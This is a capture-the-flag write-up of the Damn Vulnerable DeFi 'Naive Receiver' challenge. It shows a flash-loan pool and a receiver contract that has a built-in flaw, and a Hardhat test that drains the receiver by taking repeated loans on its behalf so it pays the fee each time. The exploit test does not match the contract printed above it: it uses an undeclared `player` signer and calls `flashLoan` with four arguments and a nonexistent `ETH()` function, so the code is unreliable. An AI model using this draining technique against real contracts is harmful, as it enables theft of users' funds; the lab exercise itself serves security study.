# Damn Vulnerable Defi: 2. Naive Receiver

> There's a lending pool offering quite expensive flash loans of Ether, which has 1000 ETH in balance.
> You also see that a user has deployed a contract with 10 ETH in balance, capable of interacting with the lending pool and receiveing flash loans of ETH.
> Drain all ETH funds from the user's contract. Doing it in a single transaction is a big plus ;)

**Objective of CTF:**

- Steal all ETH from the receiver contract.

**Target contract:**

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/utils/Address.sol";
import "@openzeppelin/contracts/security/ReentrancyGuard.sol";

/**
 * @title NaiveReceiverLenderPool
 * @author Damn Vulnerable DeFi (https://damnvulnerabledefi.xyz)
 */
contract NaiveReceiverLenderPool is ReentrancyGuard {
  using Address for address;

  uint256 private constant FIXED_FEE = 1 ether; // not the cheapest flash loan

  function fixedFee() external pure returns (uint256) {
    return FIXED_FEE;
  }

  function flashLoan(address borrower, uint256 borrowAmount) external nonReentrant {
    uint256 balanceBefore = address(this).balance;
    require(balanceBefore >= borrowAmount, "Not enough ETH in pool");

    require(borrower.isContract(), "Borrower must be a deployed contract");
    // Transfer ETH and handle control to receiver
    borrower.functionCallWithValue(abi.encodeWithSignature("receiveEther(uint256)", FIXED_FEE), borrowAmount);

    require(address(this).balance >= balanceBefore + FIXED_FEE, "Flash loan hasn't been paid back");
  }

  // Allow deposits of ETH
  receive() external payable {}
}

/**
 * @title FlashLoanReceiver
 * @author Damn Vulnerable DeFi (https://damnvulnerabledefi.xyz)
 */
contract FlashLoanReceiver {
  using Address for address payable;

  address payable private pool;

  constructor(address payable poolAddress) {
    pool = poolAddress;
  }

  // Function called by the pool during flash loan
  function receiveEther(uint256 fee) public payable {
    require(msg.sender == pool, "Sender must be pool");

    uint256 amountToBeRepaid = msg.value + fee;
    require(address(this).balance >= amountToBeRepaid, "Cannot borrow that much");

    _executeActionDuringFlashLoan();

    // Return funds to pool
    pool.sendValue(amountToBeRepaid);
  }

  // Internal function where the funds received are used
  function _executeActionDuringFlashLoan() internal {}

  // Allow deposits of ETH
  receive() external payable {}
}
```

## The Attack

The important thing to notice here is that `flashLoan` function does not care about the transaction origin, it simply takes a borrower address and a borrow amount.

As such, the receiver contract at the borrower address, if not aware of this fact, may naively implement a vulnerable `receiveEther` function for the flash loan. That is exactly what happens here.

The receiver has implemented a `receiveEther` function that only cares about `msg.sender` being the pool. We can easily get past that by asking for a flash loan for this receiver contract.

Since taking a loan results in a fee to be paid, and `receiveEther` implements the logic to pay for that fee, we can drain the funds by making it pay for the loan fee again and again. Since the fee is 1 ETH and the receiver has 10 ETH, we can ask for a loan 10 times for the receiver and the funds will be drained!

## Proof of Concept

Here is a Hardhat test to demonstrate the attack.

```typescript
describe("DamnVulnDefi 2: Naive Receiver", () => {
  let owner: SignerWithAddress;
  let attacker: SignerWithAddress;

  let pool: NaiveReceiverLenderPool;
  let receiver: FlashLoanReceiver;

  const ETHER_IN_POOL = ethers.utils.parseEther("1000"); // pool has 1000 ETH
  const ETHER_IN_RECEIVER = ethers.utils.parseEther("10"); // receiver has 10 ETH
  const ETHER_LOAN_FEE = ethers.utils.parseEther("1"); // flash loaning costs 1 ETH

  before(async () => {
    [owner, attacker] = await ethers.getSigners();
    pool = await ethers.getContractFactory("NaiveReceiverLenderPool", owner).then((f) => f.deploy());
    receiver = await ethers.getContractFactory("FlashLoanReceiver", owner).then((f) => f.deploy(pool.address));

    // send ETH to pool
    await owner.sendTransaction({ to: pool.address, value: ETHER_IN_POOL });
    expect(await ethers.provider.getBalance(pool.address)).to.be.equal(ETHER_IN_POOL);
    expect(await pool.fixedFee()).to.be.equal(ETHER_LOAN_FEE);

    // send ETH to receiver
    await owner.sendTransaction({ to: receiver.address, value: ETHER_IN_RECEIVER });
    expect(await ethers.provider.getBalance(receiver.address)).to.be.equal(ETHER_IN_RECEIVER);
  });

  it("should drain funds from receiver", async () => {
    // receiver has 10 ethers, and will pay 1 ether fee for each flash loan
    // we can make flash loans in their place, and drain everything
    // borrow amount does not matter, so we use 0 for that
    for (let i = 0; i < 10; i++) {
      await pool.connect(player).flashLoan(
        receiver.address, // borrower is receiver
        await pool.ETH(), // want to borrow ETH
        0, // amount is 0
        "0x" // data is empty
      );
    }

    // NOTE: you can also do this from within a contract, thus achieving the same result in a single transaction
  });

  after(async () => {
    // all ETH should be drained from the receiver
    expect(await ethers.provider.getBalance(receiver.address)).to.be.equal(0);
    expect(await ethers.provider.getBalance(pool.address)).to.be.equal(ETHER_IN_POOL.add(ETHER_IN_RECEIVER));
  });
});
```
